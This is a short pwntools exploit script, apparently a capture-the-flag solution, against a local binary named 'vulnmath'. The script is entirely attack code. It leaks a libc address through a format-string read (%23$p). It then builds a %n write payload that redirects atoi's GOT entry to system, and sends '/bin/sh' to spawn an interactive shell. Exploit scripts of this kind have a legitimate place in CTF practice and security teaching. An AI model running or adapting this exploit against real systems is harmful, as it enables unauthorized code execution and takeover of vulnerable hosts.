from pwn import *

elf = ELF('./vulnmath')
libc = ELF('./libc.so.6')
p = process('./vulnmath')

p.sendafter('> ','%23$p')
p.recvline()
libc_base_addr = int(p.recvline(),16) - libc.symbols['__libc_start_main'] - 0xf9
print "libc_base: "+hex(libc_base_addr)

atoi_addr = elf.got['atoi']
system_addr = libc.symbols['system'] + libc_base_addr

print "atoi: " + hex(atoi_addr)
print "system: " + hex(system_addr)

#payload = fmtstr_payload(6, {atoi_addr:system_addr})

payload = p32(atoi_addr)
payload += '%{}c%6$n'.format(system_addr-4)

print payload

p.sendline(payload)
p.sendline('/bin/sh')
p.interactive()